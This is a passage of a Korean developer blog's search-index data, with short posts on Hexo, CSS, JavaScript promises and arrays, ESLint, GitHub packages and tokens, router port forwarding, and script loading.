다음과 같다 hexo: 5.4.0 hexo-cli: 4.2.0 404.html1234567---title: 404widgets: nullcomment: falsearticle: - license: false--- 404 화면에 위젯, 코멘트, 라인센스 영역을 없애기 위해 설정했다 title은 넣어주면 head의 title tag에 반영되어서 넣어줬다 404.html12345&lt;style&gt; h1.title { display: none; }&lt;/style&gt; 실제 포스트 영역에서 보이지 않게 했다 참고 https://youtu.be/w1nhwUGsG6M https://chinsun9.github.io/2020/09/21/커스텀-404-페이지-만들기/","link":"/2021/06/15/blog-update-404/"},{"title":"CSS BEM","text":"BEM Block, Element, Modifier css class 이름 __ 를 이어붙인다 🤔 amazon clone 할 떄, 한번 사용해봤는데 마크업할 때 클래스 작성하기가 불편했다 sass를 배웠는데 어째선지 더 쓰지않게 되었다 참고 https://youtu.be/aKenj9ZQwJg","link":"/2021/06/16/CSS-BEM/"},{"title":"GTD","text":"Getting Things Done (GTD) by David Allen - Animated Book Summary And Reviewhttps://youtu.be/gCswMsONkwY 위 영상에 대한 메모 GTD 5 스텝으로 이뤄짐 capture -&gt; process -&gt; oranize -&gt; review -&gt; engage capture 머릿속에 두지 말고 모든 생각을 다 적어라 process 담아둔 아이템들에 대해 질문해라 is it actionable? yes can you do it in less than 2 minutes? yes/no yes ; 바로 실행 no ; 액션 리스트에 추가 is it actionable? no 2 choices ; discard / keep it as reference 모든 항목에 대해 생각해라 oganize 마법이 일어난다 by project, time, context 다음 항목에 대해 생각해라 시퀀스를 잘 짜라 review 매주 리뷰해라 모든 것을 원활하게 실행하려면 주간 검토가 필수적이다 목표에 맞게 진행되고 있는지 반성해라 engage let’s get cracking! ; 즉시 일을 시작해라 참고 Getting Things Done (GTD) by David Allen - Animated Book Summary And Review https://youtu.be/gCswMsONkwY","link":"/2021/06/16/GTD/"},{"title":"keyword 카테고리 생성","text":"어떤 키워드에 대해 옆에 있는 사람한테 설명할 정도로 잘 알지는 못하지만 알고 있는 대로 적어보기 잘 모르는 때, 해당 키워드에 대해 어떻게 설명할 수 있을까? 글 작성 당시의 나는 해당 키워드를 어떻게 인식하고 있을까? 흑역사 생성기 어떤 지식에 대해 아주 잘 알고 있을 때, 하나도 모르는 사람에게 잘 알려줄 수 있을까? 라는 물음으로 시작!","link":"/2021/06/16/create-keyword-category/"},{"title":"공유기가 2개일 때 포트포워딩","text":"통신사 공유기가 메인으로 있고, 내 방 공유기가 있고, 컴퓨터에 연결된다 위 상황일 때 특정 포트를 외부에서 접속할 수 있도록 포트포워딩해보자 최종 형태 공유기 DMZ 설정하면 공유기 모든 포트가 개방된다 내 방 공유기를 DMZ 설정하고, 메인 공유기에서만 포트포워딩하는 방향으로 설정해보겠다 내 방 공유기 DMZ 설정 내 방 공유기에 접속하기 위해서 cmd를 열고 ipconfig를 입력한다 이더넷 어댑터 이더넷에 기본 게이트웨이 주소로 접속한다 각자 공유기 모델명과 DMZ 설정을 검색해 DMZ를 활성화하고 적용한다 그러면 내 방 공유기로 3000번 포트 요청이 오면 내 컴퓨터 3000번 앱과 연결된다 (같은 포트로 1:1) 이제 메인 공유기를 설정해보자 메인 공유기 포트포워딩 메인 공유기에 접속을 어떻게 해야 할까? 내 방 공유기 요약정보(보통 가장 첫 메뉴, 메인화면)에 보면 외부 ip를 확인할 수 있다 외부 ip 주소로 접속하면 메인 공유기에 접속할 수 있다 여기서 포트포워딩 설정을 해주면 된다 내 방 공유기 고정아이피 설정 나는 내 방 공유기를 고정아이피로 설정해주었다 포트포워딩할 때 특정 아이피에 대해 설정해줘야 한다 내 방 공유기가 유동 아이피를 가진다면 제대로 동작하지 않을 것이다 메인 공유기에서 특정 맥에 대해 고정 아이피 설정이 되지 않았다 (무슨 퍼미션 오류..) 그래서 반대로, 내 방 공유기에서 자기 자신에 대해 고정아이피를 설정했다 (xxx.xxx.xxx.2) DNS 서버, 보조 DNS 서버는 ipconfig 명령에서 찾아 적을 수 있다 이제 메인 공유기 설정으로 돌아와서, 위에서 설정한 고정아이피 주소가 다른 컴퓨터에 할당되어 충돌이 나면 안 된다 메인 공유기에서 할당해주는 ip범위가 xxx.xxx.xxx.2를 포함하지 않도록 수정한다 포트포워딩 확인하기 나는 간단하게 vscode로 live server 켰다 내 아이피를 검색한다 (xxx.xxx.xxx.xxx) 핸드폰으로 데이터를 켜서 접속해본다","link":"/2021/06/16/two-routers-port-forwarding/"},{"title":"github 잔디, contributions calendar","text":"평소 잔디라 불러서 원래 이름이 뭔지 알아보았다 참고 https://docs.github.com/en/github/setting-up-and-managing-your-github-profile/managing-contribution-graphs-on-your-profile/viewing-contributions-on-your-profile#contributions-calendar ㅋㅋ 내 커밋 기록 식칼 모양이다","link":"/2021/06/18/github-contributions-calendar/"},{"title":"input datalist","text":"select: 안녕 안뇽 잘가 12345678&lt;label for=&quot;myInput&quot;&gt;select: &lt;/label&gt;&lt;input list=&quot;myInputList&quot; id=&quot;myInput&quot; /&gt;&lt;datalist id=&quot;myInputList&quot;&gt; &lt;option value=&quot;hello&quot;&gt;안녕&lt;/option&gt; &lt;option value=&quot;hi&quot;&gt;안뇽&lt;/option&gt; &lt;option value=&quot;bye&quot;&gt;잘가&lt;/option&gt;&lt;/datalist&gt; datalist를 사용하면 input 태그를 select 태그와 비슷하게 쓸 수 있다 input에 입력하면 자동으로 필터링된다 참고 https://developer.mozilla.org/ko/docs/Web/HTML/Element/datalist","link":"/2021/06/17/input-datalist/"},{"title":"비공개 npm package 만들어보기","text":"깃허브 레지스트리를 통해 (비공개) 패키지를 만들어보자 PAT을 통해 퍼블릭하지 않게 패키지를 배포해 볼 수 있다 물론, 공개 패키지도 가능하다 패키지 생성은 동일하고, 패키지를 받을 때만 차이가 있다 PAT : personal access token PAT 발급 github에 로그인하고, https://github.com/settings/tokens/new write:packages 권한의 personal access token을 생성한다 저장소, 패키지 만들기 package.json에 필수적으로 채워야 하는 항목들이 있어서, 브라우저로 github에 접속해서 저장소 하나를 만들어 로컬로 클론하고npm init -y 하는 것을 추천한다 타입스크립트로 만든다 123git clone https://github.com/chinsun9/hello-package.gittsc --init 디렉터리 구조123456789101112.├── dist│ ├── index.d.ts│ └── index.js├── src│ └── index.ts├── .gitignore├── .npmignore├── .npmrc├── package.json├── README.md└── tsconfig.json 디렉터리 구조는 마음대로 나는 위처럼 구성했다 src 밑에 ts 코드를 작성하고, tsc 명령으로 dist 아래 트랜스파일 된 js를 배포하는 방식이다 src 작성src/index.ts12345export class MyClassA {}export class MyClassB {}export class MyClassC {} 원하는 기능을 구현하고 외부에서 사용 가능하도록 export키워드를 붙여준다 tsconfig.json 설정 타입스크립트로 코드를 작성하고, tsc로 트랜스파일한다. 결과로 js파일이 생성된다 패키지를 인스톨한 사람들은 js파일을 사용하게 된다 tsconfig.json1234567891011{ &quot;compilerOptions&quot;: { // ... &quot;declaration&quot;: true /* Generates corresponding '.d.ts' file. */, // ... &quot;outDir&quot;: &quot;./dist&quot;, &quot;rootDir&quot;: &quot;./src&quot; // ... }, &quot;include&quot;: [&quot;src&quot;]} tsc --init 기본값으로 생성된 상태에서 위 옵션만 수정해주었다 declaration ; d.ts파일을 생성해서 자동완성에 도움을 준다 outDir ; tsc 명령의 결과로 생성되는 js 위치 rootDir, include ; root ts 파일 위치 .gitignore12distnode_modules 커밋에서 무시할 디렉터리, 파일을 나열한다 .npmignore123srctesttsconfig.json 패키지를 publish 할 때 무시할 디렉터리, 파일을 나열한다 .npmrc 워크스페이스에 위치해도 되고, 어느 워크스페이스든 상관없이 전역적으로 적용하려면 ~/.npmrc에 넣어주면 된다 .npmrc1//npm.pkg.github.com/:_authToken=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 처음에 발급받은 토큰을 xxxx... 부분에 넣어준다 자신의 토큰은 아무래도 전역으로 적용하는 게 좋아 보인다 package.jsonpackage.json123456789101112{ &quot;name&quot;: &quot;@chinsun9/hello-package&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;main&quot;: &quot;dist/index.js&quot;, &quot;types&quot;: &quot;dist/index.d.ts&quot;, &quot;repository&quot;: &quot;https://github.com/chinsun9/hello-package.git&quot;, &quot;author&quot;: &quot;chinsun9 &lt;chin_sung@naver.com&gt;&quot;, &quot;license&quot;: &quot;MIT&quot;, &quot;publishConfig&quot;: { &quot;registry&quot;: &quot;https://npm.pkg.github.com/&quot; }} 몇 가지 수정사항이 있다 name, main, types, publishConfig를 적절하게 수정한다 name ; @chinsun9/처럼 골뱅이 자기 이름을 넣어준다 main ; 트랜스파일 결과로 메인 파일을 넣어준다 types ; 자동완성을 위해서 생성된 d.ts파일을 넣어준다 publishConfig ; registry를 깃허브로 하겠다는 설정이다 패키지 배포 npm publish 저장소에 들어가서 패키지가 잘 배포되었는지 확인하다 배포한 패키지 인스톨해보기 github registry에 등록된 패키지는 퍼블릭 일지라도 PAT이 필요하다 퍼블릭일 때 패키지 주인이 생성한 토큰이 아니다 각자 자기 자신의 토큰으로 가능하다..! 비공개 패키지라면 패키지 주인이 생성한 토큰이 있어야 한다. 패키지 주인은 read:packages 권한이 있는 토큰을 알려주면 다른 사람, 컴퓨터에서 패키지를 인스톨할 수 있다 임시 디렉터리를 하나 만들고 npm init -y한다 .npmrc를 생성하고 내용을 추가한다 12//npm.pkg.github.com/:_authToken=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx@chinsun9:registry=https://npm.pkg.github.com/ 워크스페이스의 .npmrc 또는 유저 홈 디렉터리의 .npmrc 에 위 내용을 추가한다 @chinsun9:registry=https://npm.pkg.github.com/ @chinsun9으로 시작하는 패키지는 https://npm.pkg.github.com/ 에서 가져오라고 알려주자 헷갈린 점 퍼블릭한 패키지도 PAT가 필요했다 당연히 퍼블릭한 패키지에는 토큰이 필요 없을 거라 생각했다 그래서 어쩔 수 없이 패키지 오너의 토큰이 필요할 거라 생각했다 근데, 패키지 주인이 생성한 토큰이 아니더라도 패키지를 인스톨할 수 있었다 즉, github 계정을 가지고 있고, read:packages 토큰을 생성하면 퍼블릭 패키지를 인스톨할 수 있다 참고내 첫 패키지 https://github.com/chinsun9/hello-package GitHub 패키지 저장소 호스팅: GitHub Package Registry 시작하기 https://musma.github.io/2019/09/30/github-package-registry.html d.ts 만들기 https://www.typescriptlang.org/docs/handbook/declaration-files/dts-from-js.html *rc 뜻 https://stackoverflow.com/questions/52800196/what-does-the-rc-stand-for-in-the-names-of-configuration-files https://stackoverflow.com/questions/11030552/what-does-rc-mean-in-dot-files","link":"/2021/06/17/my-first-github-package/"},{"title":"setTimeout typescript","text":"12class Dice { sto: ReturnType&lt;typeof setTimeout&gt;; typescript로 웹 스크립트를 짜고 있다 clearTimeout을 사용하기 위해 멤버 변수 sto를 넣었다 근데 setTimeout의 타입이 뭘까? 에디터에서 NodeJS.Timeout라고 알려주긴 하는데.. 내 런타임을 노드가 아니라 브라우저다 ReturnType&lt;fn&gt;을 사용하면 브라우저든 SSR이든 걱정 없다고 한다 참고 https://stackoverflow.com/questions/45802988/typescript-use-correct-version-of-settimeout-node-vs-window/56239226#56239226 https://stackoverflow.com/questions/51040703/what-return-type-should-be-used-for-settimeout-in-typescript","link":"/2021/06/18/setTimeout-typescript/"},{"title":"SSR, CSR","text":"SSR, server side renderingCSR, client side rendering CSR CSR은 리액트로 만든 SPA 웹앱이라고 생각하면 된다 index.html이 텅텅 비어있고, 버튼을 누르면 자바스크립트로 동적으로 화면을 다시 그려서 페이지가 넘어가는 것처럼 보인다 처음 리액트를 배울 때 안드로이드 앱 만드는 느낌이 강하게 들었다 최초에 index.html를 서버에서 받고, 화면이 넘어가는 경우 필요한 데이터만 서버에 요청한다(JSON 등 데이터만 주고받음으로 가볍다고 볼 수 있다) 데이터를 가져오면 이미 가지고 있는 틀에다가 바인딩하여 보여준다 SSR 전통?적인 방법이다 버튼, 링크를 누르면 서버로 다른 html 파일을 요청한다 CSR과 반대로 html 내용이 꽉꽉 차있다 SEO에 유리하다 크롤러(bot)는 그냥 html의 내용을 읽으면 된다 CSR은 페이지 접속 만으로는 콘텐츠가 생성이 되어있지 않기 때문에 크롤러(bot)가 난감할 것이다","link":"/2021/06/18/ssr-csr/"},{"title":"transition ease ease-in ease-out ease-in-out 무슨 차이일까","text":"style.css123.box { transition: all 0.2s ease;} 자연스러운 변화를 주기 위해서 사용하곤 했다 ease는 여러 가지가 있는데 어떤 차이일까? transition-timing-function 영상 편집할 때 영상의 앞뒤에 투명도를 가지고 페이드인 페이드아웃하는 그래프가 있는데 그거랑 똑같다 ease, linear, ease-in, ease-out, ease-in-out, cubic-bezier, steps 가 있다 함수들 캡처 ; https://cubic-bezier.com/ ease ; 천천-빠름-천천 linear ; 등속 ease-in ; 천천-보통 ease-out ; 보통-천천 ease-in-out ; 천천-보통-천천 cubic-bezier ; 커스텀 steps ; 뚝뚝 끊어 보여준다 cubic-bezier베지에 곡선이라고 한다ease, in, in-out은 미리 정의어 있는 곡선이다각각을 cubic-bezier로 표현하면 다음과 같다 ease === cubic-bezier(0.25, 0.1, 0.25, 1.0) linear === cubic-bezier(0.0, 0.0, 1.0, 1.0) ease-in === cubic-bezier(0.42, 0, 1.0, 1.0) ease-out === cubic-bezier(0, 0, 0.58, 1.0) ease-in-out === cubic-bezier(0.42, 0, 0.58, 1.0) 참고 https://developer.mozilla.org/en-US/docs/Web/CSS/transition-timing-function https://developer.mozilla.org/en-US/docs/Web/CSS/easing-function 유용한 도구 cubic-bezier 커스텀 https://cubic-bezier.com/ 용어 베지에 곡선, 베지어 곡선 https://ko.wikipedia.org/wiki/베지에_곡선","link":"/2021/06/18/transition-timing-function/"},{"title":"windows cmd로 홈 디렉터리(~) 가기","text":"홈 디렉터리는 보통 ~로 표현된다 12345# linuxvi ~/.npmrc# windowsnotepad %userprofile%/.npmrc 유저 홈 디렉터리에 설정 파일들이 많이 있는데, 이 디렉터리를 windows cmd에서 가고 싶을 때 %userprofile%을 참조하면 된다 cmd로 유저 홈 디렉터리 이동1cd %userprofile% 홈 디렉터리 탐색기로 열기 Win + R %userprofile% 입력 후 엔터 번외 : git bash 쓰기 간단한 명령어인데, 리눅스 명령어라서 cmd에서 안될 때 git bash를 켜서 실행한다 대부분 잘 동작한다","link":"/2021/06/17/windows-user-home/"},{"title":"blog fix 카피 버튼이 안나오는 문제","text":"블로그에 코드 스니펫 오른쪽 위에 카피 버튼이 나올 때도 있고 안 나올 때도 있었다 무한 새로고침하면 종종 모습을 비춘다… (이스터에그도 아닌 것이..) 환경 hexo-theme-icarus v4.0.1 해결하기 일단 어디서 이 버튼을 생성하는지 알아내야 한다 버튼이 정상적으로 출력되었을 때 해당 버튼의 클래스명을 확인했다 그리고 main.js라는 곳에서 동적으로 버튼을 생성하고 있음을 알아냈다 themes\\icarus\\source\\js\\main.js12345678910111213console.log(clipboard, typeof ClipboardJS);if (typeof ClipboardJS !== 'undefined' &amp;&amp; clipboard) { $('figure.highlight').each(function () { const id = 'code-' + Date.now() + ((Math.random() * 1000) | 0); const button = '&lt;a href=&quot;javascript:;&quot; class=&quot;copy&quot; title=&quot;Copy&quot; data-clipboard-target=&quot;#' + id + ' .code&quot;&gt;&lt;i class=&quot;fas fa-copy&quot;&gt;&lt;/i&gt;&lt;/a&gt;'; $(this).attr('id', id); $(this).find('figcaption div.level-right').append(button); }); new ClipboardJS('.highlight .copy'); // eslint-disable-line no-new} 조건문에 ClipboardJS가 있으면 버튼을 생성하는데 main.js에는 ClipboardJS에 대해 따로 선언이 없었고, 외부 라이브러리라는 것을 알았다 이 ClipboardJS가 어디서 오는지 확인해야 했다 themes\\icarus\\layout\\common\\scripts.jsx123456789{ clipboard &amp;&amp; ( &lt;script src={cdn('clipboard', '2.0.4', 'dist/clipboard.min.js')} // async defer &gt;&lt;/script&gt; );} layout\\common\\scripts.jsx에서 가져오는 코드를 확인했는데 async으로 가져오고 있었다 문제는 clipboardJS가 로드되기 전에 main.js가 먼저 실행되는 문제였다 defer로 수정하니까 잘 동작했다! 최신 버전 확인 hexo-theme-icarus v4.2.0 최신 버전을 확인하니까 defer로 변경되어있었다… (이슈 검색했을 때는 못 찼았다…) 처음부터 최신 버전을 참고하면 좋았겠다 9개월 정도 나름대로 커스텀하면서 사용해왔는데, 나중에 시간 나면 커스텀한 내용을 유지하면서 최신 버전에 맞게 업데이트해줘야겠다 참고async, defer https://developer.mozilla.org/en-US/docs/Web/API/HTMLScriptElement","link":"/2021/06/22/blog-fix-copy-button-not-dispalyed/"},{"title":"디바운스와 스로틀","text":"스크롤 이벤트가 발생하면 1을 출력하는 함수를 실행시킨다고 하자 기본 아날로그 신호처럼 콘솔창에 1이 찍힌다 throttle 설정한 주기를 간격으로 1이 찍힌다 쓰로틀은 연속된 이벤트를 설정한 시간 간격 예) 스크롤중 300ms 마다 함수 실행 예) 네이버 검색창 자동완성 debounce 스크롤 이벤트 도중에는 아무것도 일어나지 않는다 이벤트가 끝나고 설정한 1이 찍힌다 디바운스는 연속된 이벤트가 멈추고, 한번 실행한다 마지막 이벤트로부터 설정한 시간만큼 이벤트가 발생하지 않으면 실행한다 예) 스크롤이 멈추고 300ms 뒤에 함수 실행 예) 버튼을 연속적으로 여러 번 눌러도 한 번만 실행되는… (광클 방지) 쓰는 이유 디바운스와 쓰로틀은 부하를 줄이기 위해 사용한다 매 이벤트마다 비싼 API를 호출하는 것을 방지할 수 있다","link":"/2021/06/21/debounce-throttle/"},{"title":"jest &#39;describe&#39; is not defined","text":".eslintrc.json1234567{ &quot;env&quot;: { // ... &quot;jest&quot;: true } // ...} env에 추가해준다 ⚠️ 추가 해주고 F1 &gt; eslint.restart 명령을 실행해 eslint를 재부팅한다 상황 jest를 eslint와 처음 사용해본다 eslint(no-undef) ‘describe’ is not defined.‘test’ is not defined.‘expect’ is not defined. 위 에러가 나왔다 참고 https://stackoverflow.com/questions/44611190/using-jest-in-my-react-app-describe-is-not-defined","link":"/2021/06/22/eslint-with-jest/"},{"title":"geolocation 등 HTTP에서 사용할 수 없는 Web API 목록","text":"geolocation 등 특정 Web API들은 localhost 또는 HTTPS 환경에서만 동작한다 그래서 로컬에서 테스트했을 땐 동작하는 것들이 http로 배포했을 때 동작하지 않을 수 있다 secure context가 필요한 API 목록은 아래 링크에서 확인할 수 있다 참고 https://developer.mozilla.org/en-US/docs/Web/Security/Secure_Contexts/features_restricted_to_secure_contexts","link":"/2021/06/21/features-restricted-to-secure-contexts/"},{"title":"github archived repository","text":"레포명 옆에 Archived 가 붙어있는 레포를 발견했다 뭔가 하고 찾아보았다 Archiving Repositories 읽기 전용 레포이다 더 이상 유지 보수되지 않는다는 것을 나타낸다 이 저장소에서는 새로운 활동이 생성될 수 없다 이슈나 풀리퀘스트를 생성할 수 없다 참고 https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/archiving-a-github-repository/archiving-repositories","link":"/2021/06/21/github-archived-repository/"},{"title":"github topic","text":"저장소와 관련된 태그? 같은 것을 나열할 수 있는 기능이다 사용하면 무엇을 하는 저장소인지 나타내기 좋을 것 같다 참고 https://docs.github.com/en/github/administering-a-repository/managing-repository-settings/classifying-your-repository-with-topics","link":"/2021/06/22/github-topic/"},{"title":"promise async await 예제","text":"example.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// promise는 선언과 동시에 실행된다function asyncFunction(delay, memo) { console.log(`in`, memo); const thisIsPromise = new Promise((resolve) =&gt; { setTimeout(() =&gt; { console.log(`done`, memo); resolve(delay); }, delay); }); return thisIsPromise;}const fetchData = asyncFunction.bind(null, 1000, 'fetchData');const fetchHeavyData = asyncFunction.bind(null, 3000, 'fetchHeavyData');function add(a, b) { return a + b;}async function main() { console.log(`start main`); console.time(`main`); const a = await fetchHeavyData(); const b = await fetchData(); const result = add(a, b); console.log(`main result`, result); console.timeEnd(`main`);}async function main2() { console.log(`start main2`); console.time(`main2`); const a = fetchHeavyData(); const b = fetchData(); const promiseResultArr = await Promise.all([a, b]); const result = add(...promiseResultArr); console.log(`main2 result`, result); console.timeEnd(`main2`);}main();// main2(); 친구한테 비동기에 대해 설명하면서 만든 예제 코드다 설명하기 비동기 초보 친구한테 설명하면서 어떤 부분을 설명했나? await은 async함수 내부에서 사용 가능123456// 1 workfetchData().then(console.log);// 2 not workconst data = await fetchData();console.log(data); 위는 동작하고, 아래는 동작하지 않는다고 해서 await 키워드 사용은 async 함수 내부에서만 가능하다고 말했다 express에서 비동기12345678910111213// 1 work...router.get('/async', function (req, res) { asyncFunction(1000, 'memo').then((result) =&gt; { res.json(result); });});// 2 workrouter.get('/async', async function (req, res) { const result = await asyncFunction(1000, 'memo'); res.json(result);}); 1로 했을 때 어떻게 동작하냐 해서 2로 하는 게 좋을 것 같다고 했다 실제로 테스트 결과 1, 2 모두 잘 동작했다 1의 경우 안될 줄 알았는데 express가 똑똑한 건가… then 콜백 함수에서 return12345678910111213// 1 not workasync function f() { await asyncFunction(1000, 'memo').then((result) =&gt; { return result; });}// 2 workasync function f() { return await asyncFunction(1000, 'memo').then((result) =&gt; { return result; });} 1의 경우에서 함수 f의 반환 값이 없다 하여, then 콜백 함수에서 return이 함수 f의 리턴을 의미하지 않는다고 말했다 체이닝1234567const a = await asyncFunction(1000, 'memo') // 1000 .then((result) =&gt; { return result * 2; }) // 2000 .then((result) =&gt; { return result + 200; }); // 2200 then을 끝까지 수행한 후에 결괏값을 반환한다고 알려줬다 a에는 2200이 들어간다 생략 표현123456function add1(a) { return a + 1;}asyncFunction(1000, 'memo').then(add1);asyncFunction(1000, 'memo').then((res) =&gt; add1(res)); 인자를 그대로 다른 함수에 넘겨주는 경우 생략이 가능하다 Promise.all12345678910111213141516// 1{ const a = await fetchHeavyData(); const b = await fetchData(); const result = add(a, b);}// 2{ const a = fetchHeavyData(); const b = fetchData(); const promiseResultArr = await Promise.all([a, b]); const result = add(...promiseResultArr);} promise는 선언과 동시에 실행된다 1의 경우 서로 무관한 비동기 흐름을 순차적으로 처리한다 2의 경우 Promise.all을 사용해 병렬 처리하여 1보다 효율적이다","link":"/2021/06/23/promise-async-await-example/"},{"title":"tldr","text":"too long; didn’t read tl;dr 요약 참고 https://ko.wikipedia.org/wiki/TL;DR","link":"/2021/06/22/tldr/"},{"title":"커밋 메시지 작성을 도와줄 확장도구 vscode-conventional-commits","text":"상황 기존에 Visual Studio Code Commitizen Support 확장 도구를 사용하고 있었다 그런데 커밋 body에 적는 내용이 어째선지 반영되지 않았다… 관련해서 구글링을 해봤는데 도움되는 내용을 찾지 못했다 그러다가 다른 확장도구를 발견했다 Conventional Commits Conventional Commits이라는 확장도구이다 사용법은 Commitizen과 동일하다 이 확장도구를 사용하면 body(description)가 정상적으로 등록된다! 참고 https://marketplace.visualstudio.com/items?itemName=vivaxy.vscode-conventional-commits https://github.com/vivaxy/vscode-conventional-commits","link":"/2021/06/22/vscode-conventional-commits/"},{"title":"script태그 defer, async","text":"처음 웹 프로그래밍을 배울 때 스크립트 태그는 body 최하단에 위치시키라고 배웠다 스크립트 로드 타이밍을 뒤로 미뤄서 돔을 조작하는 스크립트가 잘 동작한다 근데 요즘에는 스크립트 태그를 head 안에 선언하는 경우가 많다 defer를 사용하면 위에서 말한 효과를 볼 수 있다 근데 defer 말고도 async라는 속성을 줄 수 있다 둘이 차이는 뭘까? default (blocking further parsing) 스크립트 태그를 만나면 파싱을 멈추고 스크립트를 로드하고 실행한다 이 때 HTML 파싱을 멈춘다 스크립트가 로드 다 끝나면 이어서 남은 파싱을 진행한다 스크립트가 헤비 하면 화면이 안 그려지고 사용자가 떠날 확률도 높아지겠다 defer, async 공통 스크립트는 스크립트대로 로드하고 HTML 파싱은 계속된다 비동기적이다 defer 스크립트 로드가 완료되었다고 바로 실행되지 않는다 HTML 파싱이 모두 끝나면 실행된다 주로 돔을 조작하는 스크립트를 로드할 때 사용하면 된다 async 스크립트가 로드되고 바로 실행된다 돔을 조작하는 스크립트가 없을 때 사용하는 것이 좋다 참고 https://developer.mozilla.org/en-US/docs/Web/API/HTMLScriptElement","link":"/2021/06/24/script-defer-async/"},{"title":"eslint prefer-destructuring","text":"Use array destructuring. ??? 1234567891011121314151617let time = 0;const arrarr = [ [0, 1], [1, 11], [2, 21],];// ...// errortime = arrarr[0][0];// ok[[time]] = arrarr; // 0// errortime = arrarr[1][1];// ok[, [, time]] = arrarr; // 11 홀리… 배열과 오브젝트는 구조 분해 할당할 수 있다 오브젝트의 경우 자주 사용하지만, 배열의 경우는 별로 사용해본적이 없다 리액트를 쓰면서 useState에서 state와 setState함수를 받을 때 주로 사용했지, 이렇게 이미 선언해서 쓰던 변수에 값을 덮어쓸 때 사용해서 약간 충격이다 배열에 변수가 아닌 정적인 상수 인덱스를 통해서 꺼내는 경우 구조 분해 할당을 사용하라고 추천해줘서 알게 되었다 근데 상수 인덱스가 너무 큰 경우에는 오히려 가독성이 떨어질 것 같다 참고 https://eslint.org/docs/rules/prefer-destructuring https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment","link":"/2021/06/25/eslint-prefer-destructuring/"},{"title":"perssonal access token으로 비공개 레포 git clone 하기","text":"1git clone https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx@github.com/chinsun9/my-private-repo.git 1234git clone https://github.com/chinsun9/my-private-repo.gitCloning into 'my-private-repo'...Username for 'https://github.com': chinsun9Password for 'https://chinsun9@github.com': xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 이런 식으로 패드워드 대용으로 사용해도 되지만, github.com 앞에 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx@ 토큰@를 붙여서 cli에서 입력하는 과정을 스킵할 수 있다 이때 사용하는 토큰은 repo: Full control of private repositories 권한이 필요하다","link":"/2021/07/06/git-clone-using-pat/"},{"title":"js array.sort()가 원본을 바꾼다","text":"가끔 원본이 바뀌어서 예상치 못한 동작을 할 때가 있다 12345678910111213// 원본인 arr 이 정렬됨{ const arr = [1, 2, 3]; const sortedArr = arr.sort((a, b) =&gt; b - a); console.log(arr === sortedArr); // true}// 원본인 arr를 살리면서 정렬된 새 배열 얻기{ const arr = [1, 2, 3]; const sortedArr = [...arr].sort((a, b) =&gt; b - a); console.log(arr === sortedArr); // false} [...arr] 이런 식으로 배열을 복사할 수 있다 하나 더, 배열 복사할 때 주의할 점 그런데 number[] 타입이 아니라 {...}[]같은 객체 배열이라면 [...arr] 연산으로 새로운 배열이 만들어지기는 하지만 원소 하나하나는 여전히 call by reference 이기 때문에 완전한 복사본(깊은 복사)을 얻은 게 아니라는 점을 유의해야 한다 참고 https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Operators/Spread_syntax","link":"/2021/07/07/js-array-api-mutate-origin/"},{"title":"js empty array","text":"new Array(n)으로 초기화한 배열에 array api가 동작하지 않았다 1234567891011121314151617181920212223242526272829303132333435363738394041const arr = new Array(5);console.log(arr.length, arr); // 5 [ &lt;5 empty items&gt; ]console.log(arr.push(1), arr); // 6 [ &lt;5 empty items&gt;, 1 ]console.log(arr.push(2), arr); // 7 [ &lt;5 empty items&gt;, 1, 2 ]console.log(arr.map((v) =&gt; v * 2)); // [ &lt;5 empty items&gt;, 2, 4 ]arr.forEach((v) =&gt; { console.log(v);});// 1// 2console.log(`-----------`);for (let index = 0; index &lt; arr.length; index++) { const element = arr[index]; console.log(element); arr[index] = undefined;}// undefined// undefined// undefined// undefined// undefined// 1// 2console.log(`-----------`);arr.forEach((v) =&gt; { console.log(v);});// undefined// undefined// undefined// undefined// undefined// undefined// undefined 위에 map이나 forEach를 보면 array api가 초기화하지 않은 인덱스에 대해 동작하지 않는 것을 확인할 수 있다 직접 for문으로 찍어보면 undefined이라 나온다 그러면서 undefined으로 전부 초기화해줬다 직접 초기화해주니까 array api forEach가 동작하는 것을 확인할 수 있다 array api를 동작하지 않는 것을 경험했다 1const arr = new Array(5).fill(0); 이런 식으로 특정 값으로 직접 초기화를 해줘야 스킵되지 않고 정상적으로 api를 사용할 수 있다","link":"/2021/07/01/js-empty-array/"},{"title":"regexp lastIndex","text":"정규식 test는 true인데 exec가 동작하지 않는다?! work!123456789if (regexp.test(line)) { // 내부 포인터 재설정 regexp.lastIndex = 0; let match = regexp.exec(line); while (match) { // ... }} regexp.lastIndex = 0 잘못된 코드not work!123456if (regexp.test(line)) { // 여기서 lastIndex 갱신 let match = regexp.exec(line); // 갱신된 lastIndex부터 검색을 시작해서 첫번째 결과가 스킵됨. while (match) { // 라인에 일치하는 패턴이 한개라면 반복문한 한번도 돌지 않음 // ... }} 처음에 작성한 코드다 파일의 라인 한 줄 한 줄 읽으면서 정규식 패턴과 일치하는 라인이라면 결괏값을 받도록 만들었는데, 이상하게도 제대로 동작하지 않았다 알고 보니까 test() 메서드도 lastIndex를 갱신했었다… 사실 저 if (regexp.test(line)) {은 필요 없는 코드 같다 test와 exec를 같이 쓸 때 주의가 필요하다 참고 https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastIndex","link":"/2021/07/06/regexp-lastIndex/"},{"title":"모바일 크롬 개발자 도구 사용, 포트포워딩해서 localhost 환경 만들기","text":"모바일에서 동작하는 devicemotion 이벤트 등 디버깅하기 위해 개발자 도구를 봐야 했다 모바일에서 개발자 도구를 어떻게 켜는지 등 찾아보다가 핸드폰을 데탑에 연결하고 데탑의 크롬에서 console의 출력 결과를 확인할 수 있다 그리고 모바일 화면을 미러링 해준다 하는 법 “[Android 개발] 크롬 개발자 도구 모바일 디버깅/Mobile Debugging/ PC에서 모바일 디버깅 / 모바일 개발환경 구축”https://backstreet-programmer.tistory.com/30 위 블로그를 참고해서 핸드폰과 데탑을 연결했다 포트포워딩 하기 devicemotion, geolocation 등 